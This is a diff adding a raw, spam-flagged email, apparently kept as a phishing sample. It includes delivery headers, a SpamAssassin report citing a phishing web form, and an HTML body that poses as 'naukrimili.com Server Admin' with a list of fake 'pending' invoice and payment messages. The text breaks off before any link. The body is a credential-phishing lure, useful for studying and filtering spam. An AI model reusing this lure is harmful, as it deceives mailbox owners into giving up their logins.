@@ -1,0 +1,376 @@
+Return-Path: <project@alrawdalco.com>
+Delivered-To: hr+spam@naukrimili.com
+Received: from md-ht-9.webhostbox.net
+	by md-ht-9.webhostbox.net with LMTP
+	id KL16GNerY2jxLwsA332cTg
+	(envelope-from <project@alrawdalco.com>)
+	for <hr+spam@naukrimili.com>; Tue, 01 Jul 2025 15:05:19 +0530
+Return-path: <project@alrawdalco.com>
+Envelope-to: hr@naukrimili.com
+Delivery-date: Tue, 01 Jul 2025 15:05:19 +0530
+Received: from [151.243.93.82] (port=39693 helo=mail.alrawdalco.com)
+	by md-ht-9.webhostbox.net with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.98.1)
+	(envelope-from <project@alrawdalco.com>)
+	id 1uWXOY-000000038sx-3kCr
+	for hr@naukrimili.com;
+	Tue, 01 Jul 2025 15:05:19 +0530
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=alrawdalco.com; s=dkim; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=GU3vulSLodjV1G3zZ5pXU0QLPm8otUOvtb4SbUWpPdQ=; b=AF0r8d2O1FXYTbpvTRHQJcjHbd
+	orxtbzyMV/q7oXRDw2OYsquuOtNfUdTiuxKYNx6oMPVh2qPDMdSOsaBbyy/GBLdKNPmng74cUT05w
+	VE0xG7vRmQrgQmFdr1Aw3wRJwV7TZp4SPuXU0o24e1uhFx1ta99lM76XIm2q6LzYLw+U=;
+Received: from [20.89.208.189]
+	by mail.alrawdalco.com with esmtpsa  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.95)
+	(envelope-from <project@alrawdalco.com>)
+	id 1uWXOM-006PNm-4G
+	for hr@naukrimili.com;
+	Mon, 30 Jun 2025 22:35:06 -1100
+From: naukrimili.com <project@alrawdalco.com>
+To: hr@naukrimili.com
+Date: 1 Jul 2025 09:35:03 +0000
+Message-ID: <20250701093502.4B1A7778966D2F4B@alrawdalco.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-SPF-Fail: YES
+X-Spam-Status: Yes, score=10.9
+X-Spam-Score: 109
+X-Spam-Bar: ++++++++++
+X-Spam-Report: Spam detection software, running on the system "md-ht-9.webhostbox.net",
+ has identified this incoming email as possible spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ 
+ Content preview:  From naukrimili.com Server Admin You have six messages still
+    pending to be delivered to your inbox today Tuesday, July, 2025. Mailbox:
+    hr@naukrimili.com 
+ 
+ Content analysis details:   (10.9 points, 5.0 required)
+ 
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+                             blocked.  See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URIs: alrawdalco.com]
+  3.0 URIBL_BESO             Contains an URL listed in the URIBL blacklist
+                             [URIs: alrawdalco.com]
+  3.0 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
+                             blocklist
+                             [URIs: alrawdalco.com]
+ -2.0 RCVD_IN_VALIDITY_SAFE  RBL: Sender in Validity Safe - Contact
+                             certification@validity.com
+ [Excessive Number of Queries | <https://knowledge.validity.com/hc/en-us/articles/20961730681243>]
+ -3.0 RCVD_IN_VALIDITY_CERTIFIED RBL: Sender in Validity Certification
+                              - Contact certification@validity.com
+ -0.5 SPF_PASS               SPF: sender matches SPF record
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
+                             identical to background
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
+                             author's domain
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+                             envelope-from domain
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+                             valid
+ -0.0 T_SCC_BODY_TEXT_LINE   No description available.
+  2.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
+  3.0 RDNS_NONE              Delivered to internal network by a host with no rDNS
+  1.5 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
+  4.0 URI_PHISH              Phishing using web form
+X-Spam-Flag: YES
+Subject: [SPAM] Pending Incomplete Mail Delivery!!
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: =
+none; color: rgb(51, 51, 51); text-transform: none; letter-spacing: normal;=
+ font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size: 13px; font-=
+style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; bo=
+rder-collapse: collapse; orphans: 2; widows: 2; -webkit-text-stroke-width: =
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial; font-variant-caps: normal; font-variant-ligat=
+ures: normal;" cellspacing=3D"0"><tbody><tr><td style=3D"border: 0px solid =
+rgb(0, 0, 0); border-image: none; width: 665px; background-color: rgb(243, =
+255, 248);"><br><span style=3D"font-size: 12px;">From<span>&nbsp;<span styl=
+e=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-sp=
+acing: normal; font-family: "Times New Roman"; font-size: medium; font-styl=
+e: normal; font-weight: 400; word-spacing: 0px; float: none; display: inlin=
+e !important; white-space: normal; orphans: 2; widows: 2; -webkit-text-stro=
+ke-width: 0px; text-decoration-thickness: initial; text-decoration-style: i=
+nitial; text-decoration-color: initial; font-variant-caps: normal; font-var=
+iant-ligatures: normal;'>naukrimili.com</span></span><span>&nbsp;</span>Ser=
+ver Admin</span></td></tr></tbody></table><p style=3D'color: rgb(0, 0, 0); =
+text-transform: none; text-indent: 0px; letter-spacing: normal; font-family=
+: "Times New Roman"; font-size: medium; font-style: normal; font-weight: 40=
+0; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-=
+style: initial; text-decoration-color: initial; font-variant-caps: normal; =
+font-variant-ligatures: normal;'><br><br>You have six messages still pendin=
+g to be delivered to your inbox today Tuesday,&nbsp;July, 2025.<br><br><str=
+ong>Mailbox:</strong><span>&nbsp;<span style=3D'color: rgb(0, 0, 0); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: "Tim=
+es New Roman"; font-size: medium; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; float: none; display: inline !important; white-space: norma=
+l; orphans: 2; widows: 2; -webkit-text-stroke-width: 0px; text-decoration-t=
+hickness: initial; text-decoration-style: initial; text-decoration-color: i=
+nitial; font-variant-caps: normal; font-variant-ligatures: normal;'>hr@nauk=
+rimili.com</span></span><br><br>&nbsp;</p><table style=3D'width: 700px; hei=
+ght: 208px; color: rgb(0, 0, 0); text-transform: none; letter-spacing: norm=
+al; font-family: "Times New Roman"; font-size: 15px; word-spacing: 0px; bor=
+der-collapse: collapse; orphans: 2; widows: 2; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial; text-decoration-style: initial; tex=
+t-decoration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D=
+"2"><tbody><tr><td style=3D"width: 340px; background-color: rgb(243, 255, 2=
+48);">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
+ &nbsp; &nbsp; &nbsp; &nbsp; Subject</td><td style=3D"width: 230px; backgro=
+und-color: rgb(243, 255, 248);">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &=
+nbsp; &nbsp; Recipient</td><td style=3D"width: 150px; background-color: rgb=
+(243, 255, 248);">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Date</td=
+></tr><tr><td style=3D"width: 340px; background-color: rgb(204, 204, 255);"=
+>&nbsp;<span>&nbsp;</span><img class=3D"an1" style=3D"width: 1.2em; height:=
+ 1.2em;" alt=3D"&#9888;&#65039;" src=3D"data:image/png;base64,iVBORw0KGgoAA=
+AANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAA0JJREFUWEfFl01IFGEcxp/9=
+MlfTtiLC9CAoGQilGR36RArqlEJ0sIOshaBWVNqpukRI0SXsC7XDphHe+lChvElIgslah8gy2jQ=
+zJU3dXWdXd2Yn3nmZdWZ3ZufDrPeyy+z+5/97nnn+78tYsII164GLlK+vwpzZ21jMFvqfwA0LPE=
+K9BY8yK1Bl5l6mAGY7kOtIcfpIw+hiiDJYUJpRgV6jEKYA2L5tHltqmps0i/hnEJ4cJV97M0+id=
+NUB+KGiXHBWQb24mPERcEzAlAuGHeAHd3rgynZjcQEI0exxoSCY759NuWAIQFCfssGHnO1AaB4Y=
+f79iF4wBEPU5O9xwrgN+jwIzwrNfkQu6AWTqoywmvYPoGbAKzfcWRpC/hYOZLOgHiFNffWUaXyZ=
+sAsBaJ4+Oy0E4ETCcBV0AgnrnJh+yCoEoC/gGcPBCqmzims6EUJRn3AV9AER97m43HKmxZ3/gYn=
+ocQBjF+ZzhidAEENSnZ/mwuQCIhIExr+DCvvNOGUBfE90RyTKSBW0AqfqpT4B/Smhy9o4D3hEaQ=
+rLe3F00NRFJARLUfxuINalrsmNIAtB/b0nmiF4XkgOoqCedam/b4B2h5VkbeTy/zskA9O6OqgCy=
+uSfPXqKedLrWZkF3Py0v2Qo010dlAHqzoA5A1ANuuLKBhRkaQMlq7QJau0UAHi0NCf11TYQiQOz=
+Ey9sDMPPAzw8Jd2/p5NHSRS+XFAAPLylr0cqCMoConmw8S0HZni+SNHfyaH5Bba8ps6LmmDKAVh=
+YSqpTO+0RzgcFhHqdv0eARgNqy5ZGM/38yFxIBRPVKXSXX3g5HceomK1ypLbehrpyeC0ormQsyA=
+L3qSZPhMR7Hr9LNp7HagfL96gDJJkIOoFO9qLK9h0WAASqP2JCRlnxTVXMhVmVEPQEIMDyeveaE=
+z8qjdk0ANReWAQyqb3sVwY3HdPs9VGLD/Xr58aw3CwKAUfWkpu3lEhrbaQYO77LjQYP8dFQLZPx=
+EUACD6kmNn+HxtDeCH7+iOHdiDTI1MiACxWdBBOA1pu6v/rww+lF4o7LyKP4vAOJjkALQg+cfLD=
+Y4h9DE19gLrXQMXWDtRavJEJ4eBzs3CTaMd+Ir/R/U3uPC4zyhSAAAAABJRU5ErkJggg=3D=3D"=
+ width=3D"26" height=3D"26">&nbsp;FW: Invoice copy AWB No. 325-2322</td><td=
+ style=3D"width: 230px; background-color: rgb(204, 204, 255);">&nbsp; &nbsp=
+; To:<span>&nbsp;<span style=3D'color: rgb(0, 0, 0); text-transform: none; =
+text-indent: 0px; letter-spacing: normal; font-family: "Times New Roman"; f=
+ont-size: medium; font-style: normal; font-weight: 400; word-spacing: 0px; =
+float: none; display: inline !important; white-space: normal; orphans: 2; w=
+idows: 2; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
+l; text-decoration-style: initial; text-decoration-color: initial; font-var=
+iant-caps: normal; font-variant-ligatures: normal;'>hr@naukrimili.com</span=
+></span></td><td style=3D"width: 150px; background-color: rgb(204, 204, 255=
+);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;30/06/2025</td></tr><tr><td style=3D"widt=
+h: 340px; background-color: rgb(204, 204, 255);">&nbsp;<span>&nbsp;</span><=
+img class=3D"an1" style=3D"width: 1.2em; height: 1.2em;" alt=3D"&#9888;&#65=
+039;" src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABz=
+enr0AAAAAXNSR0IArs4c6QAAA0JJREFUWEfFl01IFGEcxp/9MlfTtiLC9CAoGQilGR36RArqlEJ=
+0sIOshaBWVNqpukRI0SXsC7XDphHe+lChvElIgslah8gy2jQzJU3dXWdXd2Yn3nmZdWZ3ZufDrP=
+eyy+z+5/97nnn+78tYsII164GLlK+vwpzZ21jMFvqfwA0LPEK9BY8yK1Bl5l6mAGY7kOtIcfpIw=
++hiiDJYUJpRgV6jEKYA2L5tHltqmps0i/hnEJ4cJV97M0+idNUB+KGiXHBWQb24mPERcEzAlAuG=
+HeAHd3rgynZjcQEI0exxoSCY759NuWAIQFCfssGHnO1AaB4Yf79iF4wBEPU5O9xwrgN+jwIzwrN=
+fkQu6AWTqoywmvYPoGbAKzfcWRpC/hYOZLOgHiFNffWUaXyZsAsBaJ4+Oy0E4ETCcBV0AgnrnJh=
++yCoEoC/gGcPBCqmzims6EUJRn3AV9AER97m43HKmxZ3/gYnocQBjF+ZzhidAEENSnZ/mwuQCIh=
+IExr+DCvvNOGUBfE90RyTKSBW0AqfqpT4B/Smhy9o4D3hEaQrLe3F00NRFJARLUfxuINalrsmNI=
+AtB/b0nmiF4XkgOoqCedam/b4B2h5VkbeTy/zskA9O6OqgCyuSfPXqKedLrWZkF3Py0v2Qo010d=
+lAHqzoA5A1ANuuLKBhRkaQMlq7QJau0UAHi0NCf11TYQiQOzEy9sDMPPAzw8Jd2/p5NHSRS+XFA=
+APLylr0cqCMoConmw8S0HZni+SNHfyaH5Bba8ps6LmmDKAVhYSqpTO+0RzgcFhHqdv0eARgNqy5=
+ZGM/38yFxIBRPVKXSXX3g5HceomK1ypLbehrpyeC0ormQsyAL3qSZPhMR7Hr9LNp7HagfL96gDJ=
+JkIOoFO9qLK9h0WAASqP2JCRlnxTVXMhVmVEPQEIMDyeveaEz8qjdk0ANReWAQyqb3sVwY3HdPs=
+9VGLD/Xr58aw3CwKAUfWkpu3lEhrbaQYO77LjQYP8dFQLZPxEUACD6kmNn+HxtDeCH7+iOHdiDT=
+I1MiACxWdBBOA1pu6v/rww+lF4o7LyKP4vAOJjkALQg+cfLDY4h9DE19gLrXQMXWDtRavJEJ4eB=
+zs3CTaMd+Ir/R/U3uPC4zyhSAAAAABJRU5ErkJggg=3D=3D" width=3D"26" height=3D"26"=
+>&nbsp;Updated Sea Freight Quotation</td><td style=3D"width: 230px; backgro=
+und-color: rgb(204, 204, 255);">&nbsp; &nbsp; To:<span>&nbsp;<span style=3D=
+'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacin=
+g: normal; font-family: "Times New Roman"; font-size: medium; font-style: n=
+ormal; font-weight: 400; word-spacing: 0px; float: none; display: inline !i=
+mportant; white-space: normal; orphans: 2; widows: 2; -webkit-text-stroke-w=
+idth: 0px; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial; font-variant-caps: normal; font-variant=
+-ligatures: normal;'>hr@naukrimili.com</span></span></td><td style=3D"width=
+: 150px; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;30/06/2025</td></tr><tr><td style=3D"width: 340px; background-color: rgb=
+(204, 204, 255);">&nbsp;<span>&nbsp;</span><img class=3D"an1" style=3D"widt=
+h: 1.2em; height: 1.2em;" alt=3D"&#9888;&#65039;" src=3D"data:image/png;bas=
+e64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAA0JJREF=
+UWEfFl01IFGEcxp/9MlfTtiLC9CAoGQilGR36RArqlEJ0sIOshaBWVNqpukRI0SXsC7XDphHe+l=
+ChvElIgslah8gy2jQzJU3dXWdXd2Yn3nmZdWZ3ZufDrPeyy+z+5/97nnn+78tYsII164GLlK+vw=
+pzZ21jMFvqfwA0LPEK9BY8yK1Bl5l6mAGY7kOtIcfpIw+hiiDJYUJpRgV6jEKYA2L5tHltqmps0=
+i/hnEJ4cJV97M0+idNUB+KGiXHBWQb24mPERcEzAlAuGHeAHd3rgynZjcQEI0exxoSCY759NuWA=
+IQFCfssGHnO1AaB4Yf79iF4wBEPU5O9xwrgN+jwIzwrNfkQu6AWTqoywmvYPoGbAKzfcWRpC/hY=
+OZLOgHiFNffWUaXyZsAsBaJ4+Oy0E4ETCcBV0AgnrnJh+yCoEoC/gGcPBCqmzims6EUJRn3AV9A=
+ER97m43HKmxZ3/gYnocQBjF+ZzhidAEENSnZ/mwuQCIhIExr+DCvvNOGUBfE90RyTKSBW0Aqfqp=
+T4B/Smhy9o4D3hEaQrLe3F00NRFJARLUfxuINalrsmNIAtB/b0nmiF4XkgOoqCedam/b4B2h5Vk=
+beTy/zskA9O6OqgCyuSfPXqKedLrWZkF3Py0v2Qo010dlAHqzoA5A1ANuuLKBhRkaQMlq7QJau0=
+UAHi0NCf11TYQiQOzEy9sDMPPAzw8Jd2/p5NHSRS+XFAAPLylr0cqCMoConmw8S0HZni+SNHfya=
+H5Bba8ps6LmmDKAVhYSqpTO+0RzgcFhHqdv0eARgNqy5ZGM/38yFxIBRPVKXSXX3g5HceomK1yp=
+LbehrpyeC0ormQsyAL3qSZPhMR7Hr9LNp7HagfL96gDJJkIOoFO9qLK9h0WAASqP2JCRlnxTVXM=
+hVmVEPQEIMDyeveaEz8qjdk0ANReWAQyqb3sVwY3HdPs9VGLD/Xr58aw3CwKAUfWkpu3lEhrbaQ=
+YO77LjQYP8dFQLZPxEUACD6kmNn+HxtDeCH7+iOHdiDTI1MiACxWdBBOA1pu6v/rww+lF4o7LyK=
+P4vAOJjkALQg+cfLDY4h9DE19gLrXQMXWDtRavJEJ4eBzs3CTaMd+Ir/R/U3uPC4zyhSAAAAABJ=
+RU5ErkJggg=3D=3D" width=3D"26" height=3D"26">&nbsp;AW: PO#203477 INVOICES</=
+td><td style=3D"width: 230px; background-color: rgb(204, 204, 255);">&nbsp;=
+ &nbsp; To:<span>&nbsp;<span style=3D'color: rgb(0, 0, 0); text-transform: =
+none; text-indent: 0px; letter-spacing: normal; font-family: "Times New Rom=
+an"; font-size: medium; font-style: normal; font-weight: 400; word-spacing:=
+ 0px; float: none; display: inline !important; white-space: normal; orphans=
+: 2; widows: 2; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial; text-decoration-color: initial; fo=
+nt-variant-caps: normal; font-variant-ligatures: normal;'>hr@naukrimili.com=
+</span></span></td><td style=3D"width: 150px; background-color: rgb(204, 20=
+4, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01/07/2025</td></tr><tr><td style=
+=3D"width: 340px; background-color: rgb(204, 204, 255);">&nbsp;<span>&nbsp;=
+</span><img class=3D"an1" style=3D"width: 1.2em; height: 1.2em;" alt=3D"&#9=
+888;&#65039;" src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAg=
+CAYAAABzenr0AAAAAXNSR0IArs4c6QAAA0JJREFUWEfFl01IFGEcxp/9MlfTtiLC9CAoGQilGR3=
+6RArqlEJ0sIOshaBWVNqpukRI0SXsC7XDphHe+lChvElIgslah8gy2jQzJU3dXWdXd2Yn3nmZdW=
+Z3ZufDrPeyy+z+5/97nnn+78tYsII164GLlK+vwpzZ21jMFvqfwA0LPEK9BY8yK1Bl5l6mAGY7k=
+OtIcfpIw+hiiDJYUJpRgV6jEKYA2L5tHltqmps0i/hnEJ4cJV97M0+idNUB+KGiXHBWQb24mPER=
+cEzAlAuGHeAHd3rgynZjcQEI0exxoSCY759NuWAIQFCfssGHnO1AaB4Yf79iF4wBEPU5O9xwrgN=
++jwIzwrNfkQu6AWTqoywmvYPoGbAKzfcWRpC/hYOZLOgHiFNffWUaXyZsAsBaJ4+Oy0E4ETCcBV=
+0AgnrnJh+yCoEoC/gGcPBCqmzims6EUJRn3AV9AER97m43HKmxZ3/gYnocQBjF+ZzhidAEENSnZ=
+/mwuQCIhIExr+DCvvNOGUBfE90RyTKSBW0AqfqpT4B/Smhy9o4D3hEaQrLe3F00NRFJARLUfxuI=
+NalrsmNIAtB/b0nmiF4XkgOoqCedam/b4B2h5VkbeTy/zskA9O6OqgCyuSfPXqKedLrWZkF3Py0=
+v2Qo010dlAHqzoA5A1ANuuLKBhRkaQMlq7QJau0UAHi0NCf11TYQiQOzEy9sDMPPAzw8Jd2/p5N=
+HSRS+XFAAPLylr0cqCMoConmw8S0HZni+SNHfyaH5Bba8ps6LmmDKAVhYSqpTO+0RzgcFhHqdv0=
+eARgNqy5ZGM/38yFxIBRPVKXSXX3g5HceomK1ypLbehrpyeC0ormQsyAL3qSZPhMR7Hr9LNp7Ha=
+gfL96gDJJkIOoFO9qLK9h0WAASqP2JCRlnxTVXMhVmVEPQEIMDyeveaEz8qjdk0ANReWAQyqb3s=
+VwY3HdPs9VGLD/Xr58aw3CwKAUfWkpu3lEhrbaQYO77LjQYP8dFQLZPxEUACD6kmNn+HxtDeCH7=
++iOHdiDTI1MiACxWdBBOA1pu6v/rww+lF4o7LyKP4vAOJjkALQg+cfLDY4h9DE19gLrXQMXWDtR=
+avJEJ4eBzs3CTaMd+Ir/R/U3uPC4zyhSAAAAABJRU5ErkJggg=3D=3D" width=3D"26" heigh=
+t=3D"26">&nbsp;Re: &#20851;&#20110;&#21551;&#21160;&#21496;&#32534;&#21046;=
+01/07/2025&#35745;&#21010;</td><td style=3D"width: 230px; background-color:=
+ rgb(204, 204, 255);">&nbsp; &nbsp; To:<span>&nbsp;<span style=3D'color: rg=
+b(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal;=
+ font-family: "Times New Roman"; font-size: medium; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; float: none; display: inline !important; =
+white-space: normal; orphans: 2; widows: 2; -webkit-text-stroke-width: 0px;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial; font-variant-caps: normal; font-variant-ligatures=
+: normal;'>hr@naukrimili.com</span></span></td><td style=3D"width: 150px; b=
+ackground-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01/07/2=
+025</td></tr><tr><td style=3D"width: 340px; background-color: rgb(204, 204,=
+ 255);">&nbsp;<span>&nbsp;</span><img class=3D"an1" style=3D"width: 1.2em; =
+height: 1.2em;" alt=3D"&#9888;&#65039;" src=3D"data:image/png;base64,iVBORw=
+0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAA0JJREFUWEfFl01IF=
+GEcxp/9MlfTtiLC9CAoGQilGR36RArqlEJ0sIOshaBWVNqpukRI0SXsC7XDphHe+lChvElIgsla=
+h8gy2jQzJU3dXWdXd2Yn3nmZdWZ3ZufDrPeyy+z+5/97nnn+78tYsII164GLlK+vwpzZ21jMFvq=
+fwA0LPEK9BY8yK1Bl5l6mAGY7kOtIcfpIw+hiiDJYUJpRgV6jEKYA2L5tHltqmps0i/hnEJ4cJV=
+97M0+idNUB+KGiXHBWQb24mPERcEzAlAuGHeAHd3rgynZjcQEI0exxoSCY759NuWAIQFCfssGHn=
+O1AaB4Yf79iF4wBEPU5O9xwrgN+jwIzwrNfkQu6AWTqoywmvYPoGbAKzfcWRpC/hYOZLOgHiFNf=
+fWUaXyZsAsBaJ4+Oy0E4ETCcBV0AgnrnJh+yCoEoC/gGcPBCqmzims6EUJRn3AV9AER97m43HKm=
+xZ3/gYnocQBjF+ZzhidAEENSnZ/mwuQCIhIExr+DCvvNOGUBfE90RyTKSBW0AqfqpT4B/Smhy9o=
+4D3hEaQrLe3F00NRFJARLUfxuINalrsmNIAtB/b0nmiF4XkgOoqCedam/b4B2h5VkbeTy/zskA9=
+O6OqgCyuSfPXqKedLrWZkF3Py0v2Qo010dlAHqzoA5A1ANuuLKBhRkaQMlq7QJau0UAHi0NCf11=
+TYQiQOzEy9sDMPPAzw8Jd2/p5NHSRS+XFAAPLylr0cqCMoConmw8S0HZni+SNHfyaH5Bba8ps6L=
+mmDKAVhYSqpTO+0RzgcFhHqdv0eARgNqy5ZGM/38yFxIBRPVKXSXX3g5HceomK1ypLbehrpyeC0=
+ormQsyAL3qSZPhMR7Hr9LNp7HagfL96gDJJkIOoFO9qLK9h0WAASqP2JCRlnxTVXMhVmVEPQEIM=
+DyeveaEz8qjdk0ANReWAQyqb3sVwY3HdPs9VGLD/Xr58aw3CwKAUfWkpu3lEhrbaQYO77LjQYP8=
+dFQLZPxEUACD6kmNn+HxtDeCH7+iOHdiDTI1MiACxWdBBOA1pu6v/rww+lF4o7LyKP4vAOJjkAL=
+Qg+cfLDY4h9DE19gLrXQMXWDtRavJEJ4eBzs3CTaMd+Ir/R/U3uPC4zyhSAAAAABJRU5ErkJggg=
+=3D=3D" width=3D"26" height=3D"26">&nbsp;Fwd: Payment ---- Forwarded messag=
+e ----</td><td style=3D"width: 230px; background-color: rgb(204, 204, 255);=
+">&nbsp; &nbsp; To:<span>&nbsp;<span style=3D'color: rgb(0, 0, 0); text-tra=
+nsform: none; text-indent: 0px; letter-spacing: normal; font-family: "Times=
+ New Roman"; font-size: medium; font-style: normal; font-weight: 400; word-=
+spacing: 0px; float: none; display: inline !important; white-space: normal;=
+ orphans: 2; widows: 2; -webkit-text-stroke-width: 0px; text-decoration-thi=
+ckness: initial; text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-caps: normal; font-variant-ligatures: normal;'>hr@naukri=
+mili.com</span></span></td><td style=3D"width: 150px; background-color: rgb=
+(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01/07/2025</td></tr><tr><td=
+ style=3D"width: 340px; background-color: rgb(204, 204, 255);">&nbsp;<span>=
+&nbsp;</span><img class=3D"an1" style=3D"width: 1.2em; height: 1.2em;" alt=
+=3D"&#9888;&#65039;" src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA=
+CAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAA0JJREFUWEfFl01IFGEcxp/9MlfTtiLC9CAo=
+GQilGR36RArqlEJ0sIOshaBWVNqpukRI0SXsC7XDphHe+lChvElIgslah8gy2jQzJU3dXWdXd2Y=
+n3nmZdWZ3ZufDrPeyy+z+5/97nnn+78tYsII164GLlK+vwpzZ21jMFvqfwA0LPEK9BY8yK1Bl5l=
+6mAGY7kOtIcfpIw+hiiDJYUJpRgV6jEKYA2L5tHltqmps0i/hnEJ4cJV97M0+idNUB+KGiXHBWQ=
+b24mPERcEzAlAuGHeAHd3rgynZjcQEI0exxoSCY759NuWAIQFCfssGHnO1AaB4Yf79iF4wBEPU5=
+O9xwrgN+jwIzwrNfkQu6AWTqoywmvYPoGbAKzfcWRpC/hYOZLOgHiFNffWUaXyZsAsBaJ4+Oy0E=
+4ETCcBV0AgnrnJh+yCoEoC/gGcPBCqmzims6EUJRn3AV9AER97m43HKmxZ3/gYnocQBjF+Zzhid=
+AEENSnZ/mwuQCIhIExr+DCvvNOGUBfE90RyTKSBW0AqfqpT4B/Smhy9o4D3hEaQrLe3F00NRFJA=
+RLUfxuINalrsmNIAtB/b0nmiF4XkgOoqCedam/b4B2h5VkbeTy/zskA9O6OqgCyuSfPXqKedLrW=
+ZkF3Py0v2Qo010dlAHqzoA5A1ANuuLKBhRkaQMlq7QJau0UAHi0NCf11TYQiQOzEy9sDMPPAzw8=
+Jd2/p5NHSRS+XFAAPLylr0cqCMoConmw8S0HZni+SNHfyaH5Bba8ps6LmmDKAVhYSqpTO+0Rzgc=
+FhHqdv0eARgNqy5ZGM/38yFxIBRPVKXSXX3g5HceomK1ypLbehrpyeC0ormQsyAL3qSZPhMR7Hr=
+9LNp7HagfL96gDJJkIOoFO9qLK9h0WAASqP2JCRlnxTVXMhVmVEPQEIMDyeveaEz8qjdk0ANReW=
+AQyqb3sVwY3HdPs9VGLD/Xr58aw3CwKAUfWkpu3lEhrbaQYO77LjQYP8dFQLZPxEUACD6kmNn+H=
+xtDeCH7+iOHdiDTI1MiACxWdBBOA1pu6v/rww+lF4o7LyKP4vAOJjkALQg+cfLDY4h9DE19gLrX=
+QMXWDtRavJEJ4eBzs3CTaMd+Ir/R/U3uPC4zyhSAAAAABJRU5ErkJggg=3D=3D" width=3D"26=
+" height=3D"26">&nbsp;Purchase Order Ref Q5PRTF798GTY</td><td style=3D"widt=
+h: 230px; background-color: rgb(204, 204, 255);">&nbsp; &nbsp; To:<span>&nb=
+sp;<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: "Times New Roman"; font-size: medi=
+um; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; d=
+isplay: inline !important; white-space: normal; orphans: 2; widows: 2; -web=
+kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
+tion-style: initial; text-decoration-color: initial; font-variant-caps: nor=
+mal; font-variant-ligatures: normal;'>hr@naukrimili.com</span></span></td><=
+td style=3D"width: 160px; background-color: rgb(204, 204, 255);">&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;01/07/2025</td></tr></tbody></table><p style=3D'color: =
+rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Times New Roman"; font-size: medium; font-style: normal; f=
+ont-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows=
+: 2; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; te=
+xt-decoration-style: initial; text-decoration-color: initial; font-variant-=
+caps: normal; font-variant-ligatures: normal;'>&nbsp;</p><ol style=3D'color=
